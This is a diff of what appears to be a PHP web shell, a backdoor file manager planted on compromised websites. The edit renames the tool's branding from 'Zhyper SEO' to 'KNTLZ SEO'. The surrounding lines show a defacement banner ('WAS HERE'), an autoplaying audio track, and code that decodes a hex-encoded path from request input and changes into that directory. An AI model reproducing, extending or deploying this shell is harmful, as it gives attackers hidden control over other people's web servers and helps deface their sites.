@@ -130,7 +130,7 @@ window.onerror = ClearError;
  
 <br>
 <audio src="https://nathanprinsley-files.prinsh.com/data-1/mp3/jeremy-flick_anonymous.mp3" autoplay="1" loop="1"></audio>
-<h1>Zhyper SEO</h1>
+<h1>KNTLZ SEO</h1>
  
  
 <div id="matrix" class="auto-style8">Kontolodonzzz WAS HERE !!!</div><br>
@@ -555,9 +555,9 @@ snowStorm.useTwinkleEffect = true;
 	echo "
 	<html>
 	<head>
-		<title>Zhyper Seo</title>
+		<title>KNTLZ Seo</title>
 		<meta charset='UTF-8'>
-		<meta name='author' content='Zhyper Seo'>
+		<meta name='author' content='KNTLZ Seo'>
 		<meta name='viewport' content='width=device-width, initial-scale=0.70'>
 		<link rel='icon' href='https://chat.openai.com/apple-touch-icon.png'>
 		<link rel='stylesheet' href='https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css'>
@@ -596,7 +596,7 @@ snowStorm.useTwinkleEffect = true;
 	<div class='container-fluid'>
 	<div class='py-3' id='main'>
 		<div class='box shadow bg-dark p-4 rounded-3'>
-			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4>Zhyper Seo</h4></a>";
+			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4>KNTLZ Seo</h4></a>";
 			if(isset($_7['path'])){
 				$path = unhex($_7['path']);
 				chdir($path);
@@ -2002,7 +2002,7 @@ Allow from all
 		?>
 		</tbody>
 		</table>
-		</div><div class='text-secondary'>Zhyper Seo</div>
+		</div><div class='text-secondary'>KNTLZ Seo</div>
 	</div>
 </div>
 </body>
